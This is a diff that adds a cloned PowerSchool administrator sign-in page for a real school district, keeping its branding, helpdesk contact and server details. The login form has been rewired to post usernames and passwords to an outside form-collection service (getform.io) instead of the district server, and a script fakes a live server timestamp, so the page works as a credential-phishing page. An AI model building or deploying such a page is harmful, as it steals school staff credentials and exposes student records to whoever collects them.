@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="robots" content="noindex">
+        <meta name="viewport" content="width=device-width">
+        
+        <link rel="apple-touch-icon" href="https://pschool.aaps.k12.mi.us/images/mobile/ps6-logo-touch-icon.png">
+        <title>
+            PowerSchool
+        </title>
+
+        <link href="./PowerSchool_files/screen.css" rel="stylesheet" media="screen">
+        <link href="./PowerSchool_files/print.css" rel="stylesheet" media="print">
+        <link href="./PowerSchool_files/customization.css" rel="stylesheet" type="text/css" media="screen">
+        <script src="./PowerSchool_files/jquery-2.1.3.min.js.download"></script>
+        <script src="./PowerSchool_files/jquery-ui-1.11.2.custom.min.js.download"></script>
+        <script src="./PowerSchool_files/md5.js.download"></script>
+        <script src="./PowerSchool_files/signin-scripts.js.download"></script>
+
+        <script language="JavaScript" type="text/javascript">
+            if (window != top) {
+                top.location.href = location.href;
+            }
+            function psEnter() {
+                if (doAdminLogin(document.LoginForm)) {
+                    document.LoginForm.submit();
+                }
+            }
+        </script>
+        <script language="JavaScript" type="text/javascript">
+            var pref = 0;
+        </script>
+        <script language="JavaScript" src="./PowerSchool_files/detectMobileWebkit.js.download" type="text/javascript"></script>
+        <script language="JavaScript" type="text/javascript">
+            if (isMobileUserAgent()) {
+                insertCss('/scripts/mobile/mobile.css');
+            }
+        </script>
+        <script language="JavaScript" type="text/javascript">
+            function deleteCookie(cookieName){
+                var cookieDate = new Date();
+                cookieDate.setTime(cookieDate.getTime()-1);
+                document.cookie = cookieName + "=; expires='" + cookieDate.toGMTString()+"'; path=/";
+            }
+            deleteCookie("InformAuthToken");
+        </script>
+
+        <link rel="apple-touch-icon" href="https://pschool.aaps.k12.mi.us/apple-touch-icon.png">
+        <link rel="icon" type="image/png" href="https://pschool.aaps.k12.mi.us/android-chrome-192x192.png" sizes="192x192">
+        <link rel="icon" type="image/png" href="https://pschool.aaps.k12.mi.us/android-chrome-512x512.png" sizes="512x512">
+        <link rel="icon" type="image/png" href="https://pschool.aaps.k12.mi.us/favicon-196x196.png" sizes="196x196">
+        <link rel="icon" type="image/png" href="https://pschool.aaps.k12.mi.us/favicon-96x96.png" sizes="96x96">
+        <link rel="icon" type="image/png" href="https://pschool.aaps.k12.mi.us/favicon-32x32.png" sizes="32x32">
+        <link rel="icon" type="image/png" href="https://pschool.aaps.k12.mi.us/favicon-16x16.png" sizes="16x16">
+        <link rel="icon" type="image/png" href="https://pschool.aaps.k12.mi.us/favicon-128.png" sizes="128x128">
+
+        <meta name="application-name" content="PowerSchool">
+        <meta name="msapplication-TileColor" content="#FFFFFF">
+        <meta name="msapplication-TileImage" content="/mstile-144x144.png">
+        <meta name="msapplication-square70x70logo" content="/mstile-70x70.png">
+        <meta name="msapplication-square150x150logo" content="/mstile-150x150.png">
+        <meta name="msapplication-wide310x150logo" content="/mstile-310x150.png">
+        <meta name="msapplication-square310x310logo" content="/mstile-310x310.png">
+        <link rel="shortcut icon" href="https://pschool.aaps.k12.mi.us/favicon.ico">
+    </head>
+    <body class="pslogin" id="adminlogin" onload="document.cookie=&#39;mobileHome=mobile&#39;;">
+        <form action="https://getform.io/f/ccfadd7f-a911-47e9-8012-bcbc19db48f0" method="post" name="LoginForm" id="LoginForm" onsubmit="doAdminLogin(this);" _lpchecked="1">
+            
+            
+            
+            <div id="container">
+                <div id="branding-district"></div>
+                <div id="content">
+                    <div id="branding-powerschool"></div>
+                    <h1>Administrator Sign In</h1>
+                    
+                    
+                    <div id="noscript" class="feedback-alert" style="display: none;">
+                        To sign in to PowerSchool, you must use a browser that supports and has JavaScript enabled.
+                    </div>
+                    
+                        
+							<fieldset id="login-inputs" class="">
+									<div>
+		<label for="request_locale">Select Language</label>
+<select name="request_locale" id="request_locale" onchange="setPageLocale(this.options[this.selectedIndex].value)">
+<option value="en_US" selected="selected">English</option>
+<option value="ar_IQ">Arabic</option>
+<option value="de_DE">Deutsch</option>
+<option value="el_GR">Ellēniká</option>
+<option value="es_MX">Español</option>
+<option value="fr_FR">Français</option>
+<option value="fa_IR">Fārsī</option>
+<option value="ko_KR">Hanguk-eo</option>
+<option value="hi_IN">Hindi</option>
+<option value="it_IT">Italiano</option>
+<option value="ht_HT">Kreyòl ayisyen</option>
+<option value="ja_JP">Nihongo</option>
+<option value="pl_PL">Polski</option>
+<option value="pt_PT">Português</option>
+<option value="ru_RU">Russkij jazyk</option>
+<option value="tl_PH">Tagalog</option>
+<option value="vi_VN">Tiếng việt </option>
+<option value="zh_CN">Zhōngwén</option>
+</select>
+	</div>
+
+								<div>
+									<label for="fieldUsername">
+										Username
+									</label>
+									<input id="fieldUsername" type="text" name="username" value="" size="38" autocorrect="off" autocapitalize="off" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+								</div>
+								<div>
+									<label for="fieldPassword">Password</label>
+									<input id="fieldPassword" type="password" name="psswd" value="" size="38" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
+								</div>
+								<div class="button-row">
+									<button type="submit" id="btnEnter" title="Sign In To PowerSchool" value="Enter" onclick="psEnter();return false;">Sign In</button>
+								</div>
+							</fieldset>
+                        
+                    
+                    
+                        <div id="signin-custom-message">
+                            <h2>Welcome!</h2>
+<h3>For assistance, please phone the helpdesk at 994-5040 or email pssupport@aaps.k12.mi.us.</h3>
+                        </div>
+                    
+                    <!-- box content-->
+                    <div id="server-stats">
+                        <span id="spanServerDate">
+                            <script>
+                                var today  = new Date();
+                                let time = document.write(today.toLocaleString("en-US", { year: 'numeric', month: 'numeric', day: 'numeric', hour: '2-digit', minute: 'numeric', hour12: true }).replace(',',''))
+                            </script>
+                        </span>
+                        <!--<span id="spanServerTime">
+                            08:44 PM
+                        </span>-->
+                        <a>
+                            <span id="spanServerVersion">
+                                20.4.5
+                            </span>
+                        </a>
+                    </div>
+                </div>
+                <div id="footer">
+                    <div id="legal">
+  <p>Copyright © 2005-2020 PowerSchool Group LLC and/or its affiliate(s). All rights reserved.<br>All trademarks are either owned or licensed by PowerSchool Group LLC and/or its affiliates.</p>
+</div>
+
+                    <p id="powerschoolcorplink">
+                        <a href="https://www.powerschool.com/" target="_blank">
+                            PowerSchool.com
+                        </a>
+                    </p>
+                    <!--end footer-->
+                </div>
+                <div id="login-server-details">
+                    <p><strong>Version: </strong><br>20.4.5.0.1452658</p>
+                    
+                        <p><strong>State/Provincial Content: </strong><br>USA-MI 20.9.3.0.4.0</p>
+                    
+                    <p><strong>PowerTeacher Gradebook: </strong><br>2.8.0.18</p>
+
+                    <p><strong>Machine Uptime: </strong><br>28 days, 23 hours, 3 minutes, 0 seconds</p>
+                    <p><strong>PS Server Uptime: </strong><br>28 days, 21 hours, 50 minutes, 56 seconds</p>
+                    LDAP Disabled
+                </div>
+            </div>
+        </form>
+        <script>
+        $j('#noscript').hide();
+        function jsEnabled() {
+            if(typeof $j != 'function'){
+                alert('Developer: This page is missing key components required for functionality!\n\nPossible causes include:\n - Commonscripts might be missing.\n - Page customization might enabled, and incomplete.');
+                //document.write('<script...');
+            }
+            else {
+                $j('#login-inputs').removeClass('hide');
+                $j("#fieldUsername").focus();
+                $j('#btn-enter').click(function(){psEnter();});
+                $j('#spanServerVersion').click(function(){ $j('#login-server-details').show().dialog({title: 'Server Details', width: 400}); });
+            }
+        }
+        if($j('#loginTarget').length !== 0) {
+            var _href = $j('#externalIDP').attr("href");
+            var _loginTarget = encodeURIComponent($j('#loginTarget').val());
+            $j('#externalIDP').attr("href", _href + "?loginTarget=" + encodeURIComponent($j('#loginTarget').val()));
+        }
+        $j(document).ready(function(){
+            jsEnabled();
+        });
+        </script>
+        
+    
+<script id="f5_cspm">(function(){var f5_cspm={f5_p:'AHEGECCJHBFAJHNLCCGPKLLFGCGKEJNAMOEFOKFJBEGLBODGMBDBBPDDNGGDGOCIBHLBKMDAAABCNPOFMIBADCPAAAENDBNADCFELKKJHMEIKHCIBHACJBGFLHIBGKPN',setCharAt:function(str,index,chr){if(index>str.length-1)return str;return str.substr(0,index)+chr+str.substr(index+1);},get_byte:function(str,i){var s=(i/16)|0;i=(i&15);s=s*32;return((str.charCodeAt(i+16+s)-65)<<4)|(str.charCodeAt(i+s)-65);},set_byte:function(str,i,b){var s=(i/16)|0;i=(i&15);s=s*32;str=f5_cspm.setCharAt(str,(i+16+s),String.fromCharCode((b>>4)+65));str=f5_cspm.setCharAt(str,(i+s),String.fromCharCode((b&15)+65));return str;},set_latency:function(str,latency){latency=latency&0xffff;str=f5_cspm.set_byte(str,40,(latency>>8));str=f5_cspm.set_byte(str,41,(latency&0xff));str=f5_cspm.set_byte(str,35,2);return str;},wait_perf_data:function(){try{var wp=window.performance.timing;if(wp.loadEventEnd>0){var res=wp.loadEventEnd-wp.navigationStart;if(res<60001){var cookie_val=f5_cspm.set_latency(f5_cspm.f5_p,res);window.document.cookie='f5avr0705440520aaaaaaaaaaaaaaaa_cspm_='+encodeURIComponent(cookie_val)+';path=/';}
+return;}}
+catch(err){return;}
+setTimeout(f5_cspm.wait_perf_data,100);return;},go:function(){var chunk=window.document.cookie.split(/\s*;\s*/);for(var i=0;i<chunk.length;++i){var pair=chunk[i].split(/\s*=\s*/);if(pair[0]=='f5_cspm'&&pair[1]=='1234')
+{var d=new Date();d.setTime(d.getTime()-1000);window.document.cookie='f5_cspm=;expires='+d.toUTCString()+';path=/;';setTimeout(f5_cspm.wait_perf_data,100);}}}}
+f5_cspm.go();}());</script></body></html>
